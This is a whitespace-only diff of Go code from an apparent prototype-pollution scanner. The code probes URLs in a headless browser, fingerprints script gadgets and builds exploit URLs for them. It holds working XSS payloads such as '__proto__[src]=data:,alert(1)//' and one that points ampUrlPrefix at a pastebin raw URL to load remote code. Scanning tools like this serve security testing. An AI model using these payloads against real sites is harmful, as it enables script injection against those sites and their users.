@@ -92,7 +92,7 @@ var ppp = [4]string{
 
 func Prototype(u string) {
     res := strings.Contains(u, "?")
-
+    
     if res == true {
         queryEnum(u, `&`)
     } else {
@@ -106,7 +106,7 @@ func Prototype(u string) {
 func queryEnum(u, quote string) bool {
     for _, p := range ppp {
         full_url := u + quote + p
-
+        
         // run task list
         var res string
         err := chromedp.Run(*crawler.Browser.Ctx,
@@ -117,33 +117,33 @@ func queryEnum(u, quote string) bool {
         if err != nil {
             continue
         }
-
+        
         logging.Logger.Infoln("[Vulnerable]:", full_url)
         time.Sleep(1 * time.Second)
-
+        
         // 具体的指纹检测
         logging.Logger.Infoln("Fingerprinting the gadget...")
-
+        
         var res1 string
         err1 := chromedp.Run(*crawler.Browser.Ctx,
             chromedp.Navigate(u),
-            //change the value 5 to a higher one if your internet connection is slow
+            // change the value 5 to a higher one if your internet connection is slow
             chromedp.Sleep(8*time.Second),
             chromedp.Evaluate(fingerprint, &res1),
         )
         if err1 != nil {
             continue
         }
-
+        
         logging.Logger.Infoln(full_url, " Gadget found: ", res1)
         time.Sleep(1 * time.Second)
-
-        //vulnerable := true
+        
+        // vulnerable := true
         payloads := []string{}
         if strings.Contains(res, "default") {
             logging.Logger.Debugln(" No gadget found")
             logging.Logger.Debugln(" Website is vulnerable to Prototype Pollution, but not automatically exploitable")
-            //vulnerable = false
+            // vulnerable = false
         } else if strings.Contains(res, "Adobe Dynamic Tag Management") {
             payloads = append(payloads, u+quote+"__proto__[src]=data:,alert(1)//")
         } else if strings.Contains(res, "Akamai Boomerang") {
@@ -226,7 +226,7 @@ func queryEnum(u, quote string) bool {
         } else if strings.Contains(res, "AMP") {
             payloads = append(payloads, u+quote+"__proto__.ampUrlPrefix=https://pastebin.com/raw/E9f7BSwb")
         }
-
+        
         // 没有的话,手动测试
         output.OutChannel <- output.VulMessage{
             DataType: "web_vul",
